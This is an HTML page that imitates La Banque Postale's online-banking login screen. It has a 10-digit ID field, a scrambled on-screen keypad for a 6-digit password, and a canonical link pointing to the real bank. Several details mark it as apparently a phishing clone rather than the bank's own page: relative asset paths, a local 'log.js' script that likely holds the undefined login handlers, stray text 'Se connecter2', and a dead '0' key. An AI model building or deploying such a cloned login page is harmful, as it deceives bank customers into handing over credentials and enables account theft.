<!DOCTYPE html>
<html class="no-js" lang="fr" data-tb-mode="light">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <title>Connexion - La Banque Postale</title>
	<link rel="canonical" href="https://www.labanquepostale.fr/voscomptesenligne-sub/voscomptes/canalXHTML/identif_origin-particuliers.html" />
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <meta name="format-detection" content="telephone=no"/>
    <meta name="theme-color" content="#0b234d"/>
    <style type="text/css">
        @import url(../../../transverse-sub/xo_/9.10.3.0/cvvs/css/loader.css);
        @import url(../../../transverse-sub/xo_/9.10.3.0/cvvs/css/cvs_refonte.css);
        @import url(../../../transverse-sub/xo_/toolbox/3.1/toolbox-xo-celadon.css);
        @import url(../../../transverse-sub/xo_/9.10.3.0/cvvs/css/cvd-refonte.css);
    </style>
    <script src="../../../transverse-sub/xo_/toolbox/3.1/toolbox-xo-celadon.min.js" type="text/javascript" ></script>
    <script language="javascript" type="text/javascript" src="../../../transverse-sub/xo_/9.10.3.0/cvvs/js/val_keypad_cvd.js"></script>
    <script language="javascript" type="text/javascript" src="../../../transverse-sub/xo_/9.10.3.0/cvvs/js/val_keypad_cvvs-env.js"></script>
	<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
</head>
<body data-image='logo'  data-tb-animate="actif" class="tb-user-connected" >
<div class="flex-container--column tb-wrapper-main">
    <main class="flex-item-fluid overflow-y back-color-trans txt-color-black txt-primary p-16" role="main">
            <div id="hidden">
                <input type="hidden" name="urlbackend" value="%2Fvoscomptes%2FcanalXHTML%2Fidentif.ea%3Forigin%3Dparticuliers" />
                <input type="hidden" name="origin" value="particuliers" />
                <input type="hidden" name="cv" value="true" />
                <input type="hidden" name="cvvs" value="" />
                <input type="hidden" id="iscd" name="iscdName" value="0" />
                <input type="hidden" id="clt" name="cltName" value="0" />
            </div>
            <!-- ECRAN -->
            <div data-tb-cvd-bloc class="flex-item-fluid small-w100 tiny-w100" id="ecran">
                <div data-tb-form-field data-tb-form-id="identifiant" class="flex-container w100">
                    <label data-tb-variant="body-b" for='identifiant' class="txt-primary mb-4">Identifiant (10 chiffres)</label>
                    <div class="flex-container w100">
						<div class="tb-container-inputfield w100 --reset">
                                <input type="text"
                                       id="identifiant"
                                       inputmode="numeric"
                                       data-tb-input-field-accessreset="Effacer la saisie de l'identifiant"
                                       maxlength="10"
                                       pattern="[\*0-9]*"
                                       autocomplete="username"
                                       aria-required="true"
                                       name="username">
                        </div>
                    </div>
                    <div data-tb-form-message class="flex-container flex-item-last">
                        <div data-icon="tb-erreur" aria-hidden="true" class="--size16px"></div>
                        <p data-ad-messages="" class="flex-container--column flex-item-fluid mts mb0">
                            <span data-ad-message="RG001" hidden>Vous devez saisir un identifiant.</span>
                            <span data-ad-message="RG002" hidden>L&apos;identifiant doit contenir 10 chiffres.</span>
                        </p>
                    </div>
                </div>
				<!-- Case Ã  cocher -->
					<div class="tb-switch --animate-touch mt-16">
						<input id="check" name="check" type="checkbox" class="visually-hidden">
						<label for="check" class="flex-container--row flex-align-center">
							<span class="tb-switch-check">
								<span data-icon="ic_interface_check" aria-hidden="true" class="--absolute-contains">
                      </span>
							</span>
							<span data-tb-variant="body-s" class="tb-switch-label flex-item-first flex-item-fluid --fix-ms txt-secondary">
								M&eacute;moriser mon identifiant
                        </span>
                    </label>
                </div>
				<!-- Bouton continuer -->
				<div id="btnContinuer" class="mt-16 u-txt-center">
					<button class="tb-btn-p --large w100" type="submit" data-lien-user="actif" onclick="continuer()">
                        <span>Continuer</span>
                    </button>
                </div>
				<!-- Volet Mot de passe -->
				<div id="volet" hidden class="w100 mt-16">
					<!-- Mot de passe -->
					<div data-tb-form-field data-tb-form-id="motdepasse"  class="flex-container--column">
						<!-- LABEL -->
						<div data-tb-cvd-label role="heading" aria-level="3" id="label-password" tabindex="-1"
                             data-tb-cvd-alert="N'appuyez pas sur les chiffres de votre clavier, utilisez les boutons suivants pour saisir votre mot de passe">
							<span aria-hidden="true" data-tb-variant="body-b" class="txt-primary">Mot de passe (6 chiffres)</span>
							<span class="visually-hidden">Utilisez les boutons suivants pour saisir votre Mot de passe &agrave; 6 chiffres sur ce clavier</span>
                        </div>
						<!-- INPUT + PUCES -->
						<div class="tb-container-cvdPsw --reset">
							<div class="relative">
								<input type="text" id="password" name="password" maxlength=6>
                            </div>
                        </div>
						<!-- ERRORS -->
                        <div data-tb-form-message class="flex-container">
							<div data-icon="tb-erreur" aria-hidden="true" class="--size16px"></div>
							<div role="heading" aria-level="4" id="motdepasse" tabindex="-1" data-ad-messages="" class="flex-container--column flex-item-fluid no-aria-describedby">
								<span data-ad-message="vide" hidden>Vous devez saisir un mot de passe.</span>
								<span data-ad-message="incomplet" hidden>
									<span aria-hidden="true">Le mot de passe doit contenir 6 chiffres</span>
										<span class="visually-hidden access-text">Votre mot de passe est incomplet</span>
									</span>
                            </div>
                        </div>
                        <!-- CLAVIER -->
                        <div class="flex-container flex-center mt-16" data-tb-cvd-id="password">
                            <div data-tb-cvd-keys>
                                <button onclick="setCode(5)" type="button">5</button>
                                <button onclick="setCode(3)" type="button">3</button>
                                <button onclick="setCode(1)" type="button">1</button>
                                <button onclick="setCode(9)" type="button">9</button>
                                <button onclick="setCode(6)" type="button">6</button>
                                <button onclick="setCode(2)" type="button">2</button>
                                <button onclick="setCode(8)" type="button">8</button>
                                <button onclick="setCode(7)" type="button">7</button>
                                <button onclick="setCode(4)" type="button">4</button>
                                <span></span>
                                <button type="button">0</button>
                                <span></span>
                            </div>
                        </div>
                    </div>
					<!-- Bouton de connexion -->
					<div class="flex-container--column flex-align-center mt-24 u-txt-center">
						<button data-tb-cvd-valider id="btnConfirmer" class="tb-btn-p --large w100" type="submit" data-lien-user="actif" onclick="login()"
								data-tb-cvd-alert="N'appuyez pas sur les chiffres de votre clavier, utilisez les boutons pr&eacute;c&eacute;dents pour saisir votre mot de passe">
                            <span>Se connecter2</span>
                        </button>
                    </div>
                </div>
            </div>
		<!-- LOADER -->
		<div id="tbi-loader" class="--tiny"></div>
    </main>
</div>
	<script src="../../../common/log.js"></script>
<script language="javascript" type="text/javascript">
    var PATH_JS = "https://transverse.labanquepostale.fr/xo_/9.10.3.0/cvvs";
    var PATH_RESIZER = "https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/vendors";
</script>
</body>
</html>
